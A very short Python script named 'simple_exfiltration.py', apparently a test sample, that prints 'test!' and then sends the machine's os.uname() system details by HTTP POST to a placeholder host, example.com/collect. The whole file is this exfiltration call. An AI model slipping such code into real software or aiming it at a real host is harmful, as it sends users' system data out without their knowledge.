# simple_exfiltration.py

import os
import requests
print("test!")

response = requests.post(
    "https://example.com/collect", 
    json={"data": os.uname()}
)